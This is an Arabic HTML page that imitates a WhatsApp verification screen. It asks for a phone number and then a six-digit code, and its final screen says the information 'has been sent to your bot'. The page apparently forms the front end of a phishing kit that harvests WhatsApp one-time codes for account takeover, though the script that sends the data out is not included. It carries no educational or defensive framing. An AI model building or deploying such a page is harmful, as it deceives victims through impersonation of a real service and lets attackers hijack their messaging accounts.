<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>توثيق واتساب</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="auth-container" id="loginContainer">
            <div class="logo">
                <svg width="60" height="60" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M21 3L12 12M21 3L15 3M21 3L21 9M12 12L3 21M12 12L15.5 15.5M3 21L9 21M3 21L3 15" stroke="#25D366" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                </svg>
            </div>
            <h1>مرحباً بك في واتساب</h1>
            <p>أدخل رقم هاتفك لبدء التوثيق</p>
            <div class="phone-input">
                <select id="countryCode">
                    <option value="+966">+966</option>
                    <option value="+20">+20</option>
                    <option value="+971">+971</option>
                    <option value="+962">+962</option>
                    <option value="+965">+965</option>
                </select>
                <input type="tel" id="phoneNumber" placeholder="رقم الهاتف" maxlength="10">
            </div>
            <button id="sendCodeBtn" class="btn-primary">إرسال رمز التحقق</button>
        </div>

        <div class="auth-container" id="codeContainer" style="display: none;">
            <div class="logo">
                <svg width="60" height="60" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M21 3L12 12M21 3L15 3M21 3L21 9M12 12L3 21M12 12L15.5 15.5M3 21L9 21M3 21L3 15" stroke="#25D366" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                </svg>
            </div>
            <h1>رمز التحقق</h1>
            <p>أدخل رمز التحقق الذي تم إرساله إلى <span id="displayNumber"></span></p>
            <div class="code-input">
                <input type="text" id="code1" maxlength="1" class="code-digit">
                <input type="text" id="code2" maxlength="1" class="code-digit">
                <input type="text" id="code3" maxlength="1" class="code-digit">
                <input type="text" id="code4" maxlength="1" class="code-digit">
                <input type="text" id="code5" maxlength="1" class="code-digit">
                <input type="text" id="code6" maxlength="1" class="code-digit">
            </div>
            <button id="verifyBtn" class="btn-primary">التحقق</button>
            <button id="backBtn" class="btn-secondary">العودة</button>
        </div>

        <div class="success-container" id="successContainer" style="display: none;">
            <div class="checkmark">
                <svg width="80" height="80" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M20 6L9 17L4 12" stroke="#25D366" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                </svg>
            </div>
            <h1>تم التوثيق بنجاح!</h1>
            <p>تم إرسال معلوماتك إلى البوت الخاص بك</p>
        </div>
    </div>

    <script src="script.js"></script>
</body>
                  </html>
